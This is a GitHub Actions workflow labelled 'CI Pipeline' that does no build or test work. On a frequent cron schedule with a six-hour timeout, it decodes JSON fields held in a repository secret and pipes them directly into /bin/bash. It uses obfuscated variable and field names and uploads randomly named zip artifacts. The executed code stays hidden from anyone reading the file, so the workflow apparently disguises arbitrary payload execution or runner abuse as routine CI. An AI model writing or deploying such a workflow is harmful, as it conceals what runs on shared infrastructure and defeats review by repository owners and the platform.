name: CI Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '13 3,9,15,21 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  handler:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Launch
        env:
          oap14701: ${{ secrets.oap14701 }}
        run: |
          printf '%s' "$oap14701" | jq -r .psrl9 | /bin/bash
          echo $v20 | jq -r .qrpd798 | /bin/bash
          printf '%s' "$ub93859" | jq -r .lww988 | /bin/bash
          echo $pgec4 | jq -r .fon46 | /bin/bash
          echo $a4332 | jq -r .dwr602 | /bin/bash

      - name: Persist output
        uses: actions/upload-artifact@v4
        with:
          name: pyOBAJLQ
          path: "*.zip"
          retention-days: 1
